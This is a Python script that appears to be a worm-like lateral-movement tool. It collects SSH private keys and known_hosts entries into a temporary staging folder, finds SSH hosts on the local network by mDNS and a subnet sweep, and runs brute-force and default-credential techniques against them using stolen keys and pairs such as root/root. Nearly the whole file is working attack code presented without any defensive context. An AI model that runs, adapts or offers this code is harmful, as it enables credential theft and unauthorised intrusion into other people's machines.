import os
import sys
import json
import pathlib
import shutil
import stat
import socket
import tempfile
import subprocess
from guid import ALL_TECHNIQUES  # ssh_bruteforce, telnet_defaults

SSH_DIR = pathlib.Path.home() / ".ssh"
STAGING_DIR = pathlib.Path(tempfile.gettempdir()) / "ssh_creds"
def find_private_keys():
    keys = []
    if SSH_DIR.exists():
        for p in SSH_DIR.glob("id_*"):
            if p.is_file() and not p.name.endswith(".pub"):
                try:
                    p.chmod(stat.S_IRUSR | stat.S_IWUSR)
                except PermissionError:
                    pass
                keys.append(str(p))
    return keys

def parse_known_hosts():
    hosts = []
    kh = SSH_DIR / "known_hosts"
    if kh.exists():
        for line in kh.read_text().splitlines():
            line = line.strip()
            if not line or line.startswith(("#", "|")):
                continue
            hosts.append(line.split()[0])
    return hosts

def copy_to_staging(keys):
    STAGING_DIR.mkdir(parents=True, exist_ok=True)
    copied = []
    for key in keys:
        dest = STAGING_DIR / pathlib.Path(key).name
        shutil.copy2(key, dest)
        copied.append(str(dest))
    return copied

def prepare_ssh_data():
    keys = find_private_keys()
    hosts = parse_known_hosts()
    copied = copy_to_staging(keys)
    data = {"keys": copied, "known_hosts": hosts}
    out_file = STAGING_DIR / "ssh_data.json"
    out_file.write_text(json.dumps(data))
    print(f"[*] Собрано {len(copied)} ключей и {len(hosts)} known_hosts → {out_file}")
    return data

def get_local_prefix():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split(".")
        if len(parts) == 4:
            return ".".join(parts[:3]) + "."
    except Exception:
        pass
    return None

def probe_tcp(ip, port, timeout=0.5):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except Exception:
        return False

def discover_hosts():
    targets = set()
    # mDNS/Bonjour macOS/Linux
    if sys.platform.startswith("darwin") or sys.platform.startswith("linux"):
        mdns_cmd = None
        if shutil.which("dns-sd"):
            mdns_cmd = ["dns-sd", "-B", "_ssh._tcp", "local.", "-1"]
        elif shutil.which("avahi-browse"):
            mdns_cmd = ["avahi-browse", "-tr", "_ssh._tcp"]
        if mdns_cmd:
            try:
                out = subprocess.check_output(mdns_cmd, stderr=subprocess.DEVNULL).decode()
                for line in out.splitlines():
                    if "Add" in line or "Service" in line:
                        host = line.split()[-1].rstrip(".")
                        targets.add(host)
            except Exception:
                pass
    # Sweep
    prefix = get_local_prefix()
    if prefix:
        for i in range(1, 255):
            ip = prefix + str(i)
            if probe_tcp(ip, 22):
                targets.add(ip)
    return list(targets)

def load_creds_db(path="creds.json"):
    creds = []
    try:
        data = json.loads(pathlib.Path(path).read_text())
        creds = [(e["user"], e["pass"]) for e in data]
    except Exception:
        creds = [("root", "root"), ("admin", "admin")]

    ssh_file = STAGING_DIR / "ssh_data.json"
    if ssh_file.exists():
        try:
            ssh_data = json.loads(ssh_file.read_text())
            me = os.getlogin()
            for key in ssh_data.get("keys", []):
                creds.append((me, key))
        except Exception:
            pass
    return creds

def main():
    prepare_ssh_data()
    creds_db = load_creds_db()
    hosts = discover_hosts()
    for ip in hosts:
        open_ports = [p for p in (22, 23, 80, 445) if probe_tcp(ip, p)]
        print(f"[+] Host {ip}, open ports: {open_ports}")
        for tech in ALL_TECHNIQUES:
            if tech.applicable({"ip": ip, "ports": open_ports}):
                print(f"    -> Trying {tech.name} on {ip}")
                try:
                    if tech.execute({"ip": ip, "ports": open_ports}, creds_db):
                        print(f"[+] {tech.name} succeeded on {ip}")
                        break
                except Exception as e:
                    print(f"    !! {tech.name} error: {e}")
        else:
            print(f"[-] No technique worked on {ip}")

if __name__ == "__main__":
    main()
